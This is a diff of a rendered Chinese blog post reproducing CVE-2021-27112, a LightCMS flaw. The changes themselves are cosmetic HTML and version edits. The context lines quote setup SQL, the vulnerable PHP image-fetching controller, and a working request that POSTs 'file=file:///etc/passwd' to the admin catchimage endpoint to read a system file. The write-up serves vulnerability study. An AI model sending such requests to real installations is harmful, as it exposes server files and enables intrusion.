@@ -3,7 +3,7 @@
     <head prefix="og: http://ogp.me/ns# article: http://ogp.me/ns/article#">
     <meta charset="UTF-8" />
 
-    <meta name="generator" content="Hugo 0.83.1" /><meta name="theme-color" content="#fff" />
+    <meta name="generator" content="Hugo 0.87.0" /><meta name="theme-color" content="#fff" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     
     <meta name="format-detection" content="telephone=no, date=no, address=no, email=no" />
@@ -14,7 +14,7 @@
 
     <title>[CVE-2021-27112]LightCMS RCE漏洞复现 | tyskillのBlog</title>
 
-    <link rel="stylesheet" href="/css/meme.min.09e7384df2ebf8f7760291a0d443770f44b39f5563546dd950293ed79e8d779b.css"/>
+    <link rel="stylesheet" href="/css/meme.min.12acc0ca7f74225e7b015741d28e3038696047c86698a0fb722ce126d04c739e.css"/>
 
     
     
@@ -283,13 +283,13 @@
 <p>3、满足数据库要求：修改<code>.env</code>文件数据库用户密码 或 mysql新建需要的用户：</p>
 <div class="highlight"><div class="chroma">
 <div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span><span class="lnt">4
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-mysql" data-lang="mysql"><span class="k">CREATE</span><span class="w"> </span><span class="k">DATABASE</span><span class="w"> </span><span class="n">homestead</span><span class="p">;</span><span class="w">
+<pre tabindex="0" class="chroma"><code class="language-mysql" data-lang="mysql"><span class="k">CREATE</span><span class="w"> </span><span class="k">DATABASE</span><span class="w"> </span><span class="n">homestead</span><span class="p">;</span><span class="w">
 </span><span class="w"></span><span class="k">CREATE</span><span class="w"> </span><span class="k">USER</span><span class="w"> </span><span class="s1">&#39;homestead&#39;</span><span class="o">@</span><span class="s1">&#39;localhost&#39;</span><span class="w"> </span><span class="k">IDENTIFIED</span><span class="w"> </span><span class="k">BY</span><span class="w"> </span><span class="s1">&#39;secret&#39;</span><span class="p">;</span><span class="w">
 </span><span class="w"></span><span class="k">GRANT</span><span class="w"> </span><span class="k">ALL</span><span class="w"> </span><span class="k">PRIVILEGES</span><span class="w"> </span><span class="k">ON</span><span class="w"> </span><span class="o">*</span><span class="p">.</span><span class="o">*</span><span class="w"> </span><span class="k">TO</span><span class="w"> </span><span class="s1">&#39;homestead&#39;</span><span class="o">@</span><span class="s1">&#39;localhost&#39;</span><span class="p">;</span><span class="w">
 </span><span class="w"></span><span class="k">FLUSH</span><span class="w"> </span><span class="k">PRIVILEGES</span><span class="p">;</span><span class="w">
@@ -303,10 +303,10 @@
 <p>访问<code>http://IP/admin/neditor/serve/catchimage</code>，POST传<code>file=file:///etc/passwd</code>，此时会返回</p>
 <div class="highlight"><div class="chroma">
 <div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-json" data-lang="json"><span class="p">{</span><span class="nt">&#34;list&#34;</span><span class="p">:[{</span><span class="nt">&#34;url&#34;</span><span class="p">:</span><span class="s2">&#34;http:\/\/IP\/upload\/image\/202104\/0f1726ba83325848d47e216b29d5ab99.jpg&#34;</span><span class="p">,</span><span class="nt">&#34;source&#34;</span><span class="p">:</span><span class="s2">&#34;file:\/\/\/etc\/passwd&#34;</span><span class="p">,</span><span class="nt">&#34;state&#34;</span><span class="p">:</span><span class="s2">&#34;SUCCESS&#34;</span><span class="p">}]}</span>
+<pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="p">{</span><span class="nt">&#34;list&#34;</span><span class="p">:[{</span><span class="nt">&#34;url&#34;</span><span class="p">:</span><span class="s2">&#34;http:\/\/IP\/upload\/image\/202104\/0f1726ba83325848d47e216b29d5ab99.jpg&#34;</span><span class="p">,</span><span class="nt">&#34;source&#34;</span><span class="p">:</span><span class="s2">&#34;file:\/\/\/etc\/passwd&#34;</span><span class="p">,</span><span class="nt">&#34;state&#34;</span><span class="p">:</span><span class="s2">&#34;SUCCESS&#34;</span><span class="p">}]}</span>
 </code></pre></td></tr></table></div>
 </div>
 </div><p>直接访问链接地址即可。</p>
@@ -318,7 +318,7 @@
 <p><code>App\Http\Controllers\Admin\NEditorController::catchImage</code></p>
 <div class="highlight"><div class="chroma">
 <div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -341,7 +341,7 @@
 </span><span class="lnt">21
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-php" data-lang="php"><span class="k">public</span> <span class="k">function</span> <span class="nf">catchImage</span><span class="p">(</span><span class="nx">Request</span> <span class="nv">$request</span><span class="p">)</span>
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="k">public</span> <span class="k">function</span> <span class="nf">catchImage</span><span class="p">(</span><span class="nx">Request</span> <span class="nv">$request</span><span class="p">)</span>
 <span class="p">{</span>
     <span class="o">...</span>
     <span class="nv">$files</span> <span class="o">=</span> <span class="p">(</span><span class="k">array</span><span class="p">)</span> <span class="nv">$request</span><span class="o">-&gt;</span><span class="na">post</span><span class="p">(</span><span class="s1">&#39;file&#39;</span><span class="p">);</span>
@@ -370,7 +370,7 @@
 <p><code>App\Http\Controllers\Admin\NEditorController::fetchImageFile</code></p>
 <div class="highlight"><div class="chroma">
 <div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -383,7 +383,7 @@
 </span><span class="lnt">11
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-php" data-lang="php"><span class="c1">// 非URL格式的文件无法上传
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="c1">// 非URL格式的文件无法上传
 </span><span class="c1"></span><span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">filter_var</span><span class="p">(</span><span class="nv">$url</span><span class="p">,</span> <span class="nx">FILTER_VALIDATE_URL</span><span class="p">))</span> <span class="p">{</span>
     <span class="k">return</span> <span class="k">false</span><span class="p">;</span>
 <span class="p">}</span>
@@ -400,7 +400,7 @@
 <p><code>App\Http\Controllers\Admin\NEditorController::fetchImageFile</code></p>
 <div class="highlight"><div class="chroma">
 <div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span><span class="lnt">4
@@ -408,7 +408,7 @@
 </span><span class="lnt">6
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-php" data-lang="php"><span class="k">if</span> <span class="p">(</span><span class="nx">isWebp</span><span class="p">(</span><span class="nv">$data</span><span class="p">))</span> <span class="p">{</span>
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="k">if</span> <span class="p">(</span><span class="nx">isWebp</span><span class="p">(</span><span class="nv">$data</span><span class="p">))</span> <span class="p">{</span>
     <span class="nv">$image</span> <span class="o">=</span> <span class="nx">Image</span><span class="o">::</span><span class="na">make</span><span class="p">(</span><span class="nx">imagecreatefromwebp</span><span class="p">(</span><span class="nv">$url</span><span class="p">));</span> <span class="c1">// webp格式转化
 </span><span class="c1"></span>    <span class="nv">$extension</span> <span class="o">=</span> <span class="s1">&#39;webp&#39;</span><span class="p">;</span>
 <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
@@ -419,7 +419,7 @@
 </div><p><code>App\functions--isWebp</code></p>
 <div class="highlight"><div class="chroma">
 <div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span><span class="lnt">4
@@ -429,7 +429,7 @@
 </span><span class="lnt">8
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-php" data-lang="php"><span class="k">function</span> <span class="nf">isWebp</span><span class="p">(</span><span class="nv">$data</span><span class="p">)</span>
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="k">function</span> <span class="nf">isWebp</span><span class="p">(</span><span class="nv">$data</span><span class="p">)</span>
 <span class="p">{</span>
     <span class="k">if</span> <span class="p">(</span><span class="nx">strncmp</span><span class="p">(</span><span class="nx">substr</span><span class="p">(</span><span class="nv">$data</span><span class="p">,</span> <span class="mi">8</span><span class="p">,</span> <span class="mi">7</span><span class="p">),</span> <span class="s2">&#34;WEBPVP8&#34;</span><span class="p">,</span> <span class="mi">7</span><span class="p">)</span> <span class="o">===</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
         <span class="k">return</span> <span class="k">true</span><span class="p">;</span>
